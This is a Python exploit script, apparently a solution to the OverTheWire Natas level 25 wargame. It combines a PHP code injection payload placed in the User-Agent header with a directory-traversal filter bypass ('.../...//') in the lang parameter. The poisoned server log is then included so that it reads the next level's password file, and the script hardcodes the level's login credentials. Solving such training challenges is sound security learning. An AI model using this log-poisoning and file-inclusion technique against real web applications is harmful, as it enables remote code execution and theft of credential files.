import requests
from requests.auth import HTTPBasicAuth
from requests.sessions import RequestsCookieJar
import string
import random


def receive_response(_payload):
    auth_username = 'natas25'
    auth_password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c' 
    response = requests.post('http://natas25.natas.labs.overthewire.org/', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    return response

# receive a requests.Response object and dissect it
def dissect_response(response):

    print("Encoding: " + response.apparent_encoding)
    print("-----------------------")
    print("Content: " + str(response.content))
    print("-----------------------")
    print("Cookies: " + str(response.cookies))
    print("-----------------------")
    print("Elapsed time: " + str(response.elapsed))
    print("-----------------------")
    print("Encoding: " + str(response.encoding))
    print("-----------------------")
    print("Headers: " + str(response.headers))
    print("-----------------------")
    print("History: " + str(response.history))
    print("-----------------------")
    try:
        print("JSON: " + str(response.json()))
    except:
        pass
    print("-----------------------")
    print("Links: " + str(response.links))
    print("-----------------------")
    print("Next: " + str(response.next))
    print("-----------------------")
    print("OK:" + str(response.ok))
    print("-----------------------")
    print("Raw: " + str(response.raw))
    print("-----------------------")
    print("Reason: " + str(response.reason))
    print("-----------------------")
    print("Status code: " + str(response.status_code))
    print("-----------------------")
    print("Text: " + str(response.text))
    print("-----------------------")
    print("URL: " + str(response.url))



def exploit():
    sess = requests.Session()
    _payload = "en../"
    headers = {'User-Agent': '<?php global $__FOOTER; $__FOOTER=file_get_contents("/etc/natas_webpass/natas26"); ?>'}
    auth_username = 'natas25'
    auth_password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
    response = sess.get('http://natas25.natas.labs.overthewire.org/?lang='+_payload, auth=HTTPBasicAuth(auth_username, auth_password), headers=headers)
    dissect_response(response)
    for cookie in sess.cookies:
        value = cookie.value


    _payload = "logs/natas25_" + value + ".log"
    response = requests.get('http://natas25.natas.labs.overthewire.org/'+_payload, auth=HTTPBasicAuth(auth_username, auth_password), headers=headers)
    dissect_response(response)

    _payload = ".../...//logs/natas25_" + value + ".log"
    response = sess.get('http://natas25.natas.labs.overthewire.org/?lang='+_payload, auth=HTTPBasicAuth(auth_username, auth_password), headers=headers)
    dissect_response(response)

exploit()